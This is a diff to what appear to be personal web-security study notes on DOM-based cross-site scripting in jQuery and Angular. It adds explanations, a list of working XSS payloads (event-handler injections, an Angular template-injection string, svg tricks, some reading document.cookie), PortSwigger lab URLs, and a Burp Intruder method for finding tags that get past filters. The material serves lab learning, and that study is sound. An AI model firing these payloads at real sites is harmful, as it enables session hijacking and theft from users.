@@ -82,6 +82,86 @@
 <img src=1 onerror=alert(1)>
 ```
 
+##### DOM XSS in jQuery
+
+> The `attr()` functio can change the attributes of DOM elements.
+> If data read from a user controlled source and passed to the `attr()` function, we can insert a payload an create a XSS attack.
+> Identify jQuery via the `$` sign.
+
+> To execute JavaScript inside attributes, such as `href`, add `javascript: <code>` inside the `href` attribute.
+
+> `location.hash` was used for scrolling animations done using the `hashchange` event handler. ([[Events Module]])
+> The `hash` is user controllable, the area that is scrolled to. Payload can be inserted there.
+> The payload must trigger `hashchange` without user interaction.
+```
+<iframe src = "https://website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"
+```
+
+##### DOM XSS in [[Angular]]
+
+> If a webpage uses the `ng-app` attribute, JavaScript inside double curly braces `{{ <code> }}` will be executed anywhere inside the HTML.
+> Use the `constructor` function to return references to creating functions. These functions can be executed by adding `()` afterwards. [Function Constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function).
+> Used by going to a function in scope, and then calling the constructor with the `alert` function.
+```
+{{ $new.constructor('alert()') () }}
+```
+> The `$` is used in JavaScript frameworks and libraries.
+
+> Checking the functions in the scope using the `id` of an element in that scope.
+```
+anular.element(document.getElementById('<ID>')).scope()
+```
+
+##### Reflected DOM XSS
+
+> Sometimes websites reflect in their URL parameters data from the response.
+> The server produces data from a request, and echoes it in a response.
+> This data could be placed into an item within the DOM, such as in forms.
+> A script can then read this data, and places it into a sink that causes the exploit.
+
+##### Stored DOM XSS
+
+> Websites can store data on the server and is then included in a later response.
+> A JavaScript script within this repsonse can contain a sink that can cause the exploit.
+
+---
+
+### XSS Payloads
+
+```
+mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.
+" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and closing off the rest.
+minso> </select> <svg onload=alert()>
+<img src=1 onerror=alert(1)>
+href = javascript:alert(document.cookie)
+{{ $new.constructor('alert()') () }}
+<iframe src ="https://0a0b00b9043b4ccf8331690900400055.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
+
+//if no tags are allowed use the script technique with the location attribute
+<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
+```
+> This last one creates a custom tag `mins`, and adds the attribute `onfocus` and then focuses on it using the `#omar` at the end using its id, triggering the event. Can use the `autofocus` attribute as well.
+
+##### `<svg>`
+
+> The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
+```
+<svg> <animatetransform onbegin=alert(1)> </svg>
+
+<svg> <a>
+<animate attributeName='href' values='javascript:alert(1)'></animate>
+<text x='10' y='10'> Click </text>
+</a> </svg>
+```
+
+##### Finding the Right Tag and Event Attribute Using [[Burp Suite]]
+
+> Head to the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+1. Open the Burp Suite Intruder tab and inject the placeholders inside `<>` tags to test first the tag itself.
+2. Set the payloads to be the copied tags from the cheat sheet.
+3. After finding the correct element, find the right attribute by placing the placeholders `<element-found XX=1>`. 
+4. Set the payloads to be the copied attributes from the cheat sheet.
+
 ---
 
 ### [[Cookies]] Stealing With XSS
